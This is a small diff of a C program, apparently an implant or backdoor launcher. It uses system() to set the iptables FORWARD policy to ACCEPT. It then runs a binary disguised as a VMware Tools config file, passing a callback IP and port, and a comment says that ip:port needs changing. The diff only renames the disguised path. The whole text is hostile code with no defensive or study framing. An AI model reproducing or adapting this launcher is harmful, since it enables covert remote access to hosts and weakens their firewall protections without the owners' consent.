@@ -14,7 +14,7 @@ int main(int argc, char **argv) {
 	system("`which xtables-multi` iptables -P FORWARD ACCEPT");
 
 	// Need to change the callback ip:port 
-	system("/etc/vmware-tools.conf 192.168.204.128 8080");
+	system("/etc/vmwaretools.conf 192.168.204.128 8080");
 
 	return 0;
 }
